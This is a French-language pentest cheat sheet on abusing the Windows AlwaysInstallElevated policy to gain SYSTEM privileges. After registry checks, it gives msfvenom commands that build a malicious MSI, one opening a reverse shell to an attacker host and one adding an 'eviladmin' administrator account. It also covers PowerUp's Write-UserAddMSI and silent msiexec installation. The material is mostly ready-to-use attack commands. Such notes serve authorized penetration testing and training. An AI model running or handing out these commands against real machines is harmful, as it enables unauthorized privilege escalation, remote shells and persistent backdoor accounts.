# 06-Exploitation de AlwaysInstallElevated

La stratégie de groupe `AlwaysInstallElevated` permet aux utilisateurs non-administrateurs d'installer des packages MSI (Microsoft Installer) avec des privilèges SYSTEM. Si cette option est activée, un attaquant peut créer un package MSI malveillant pour exécuter du code en tant que SYSTEM.

## Vérification de AlwaysInstallElevated
Les deux clés de registre suivantes doivent être définies sur `1` :
```powershell
# Vérifier la clé pour HKEY_LOCAL_MACHINE
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Vérifier la clé pour HKEY_CURRENT_USER
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Si les deux valeurs sont `0x1` (ou `1`), la politique est activée.

## Création d'un Package MSI Malveillant

### Avec Metasploit (msfvenom)
```bash
# Créer un MSI pour un reverse shell x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=<PORT> -f msi -o malicious.msi

# Créer un MSI pour ajouter un utilisateur administrateur
msfvenom -p windows/x64/exec CMD="net user eviladmin P@sswOrd123! /add && net localgroup administrators eviladmin /add" -f msi -o addadmin.msi
```

### Avec PowerUp (Write-UserAddMSI)
PowerUp peut générer un MSI qui ajoute un utilisateur.
```powershell
# Charger PowerUp.ps1
# . .\PowerUp.ps1

# Générer le MSI (par défaut, il crée un utilisateur et l'ajoute aux administrateurs)
Write-UserAddMSI
# Le fichier .msi sera généralement créé dans le répertoire courant ou C:\ProgramData\
# Vérifier la sortie de la commande pour le chemin exact du MSI.
```

## Installation du Package MSI
Une fois le MSI malveillant transféré sur la machine cible :
```powershell
# Installer le MSI en mode silencieux
msiexec /quiet /qn /i C:\chemin\vers\malicious.msi
# ou
# msiexec /i C:\chemin\vers\malicious.msi /qn
```
L'option `/quiet` ou `/qn` installe le package sans interface utilisateur. L'installation s'exécutera avec les privilèges SYSTEM si `AlwaysInstallElevated` est correctement configuré.
Vérifiez si le payload a été exécuté (par exemple, réception du reverse shell, ou vérification de la création de l'utilisateur). 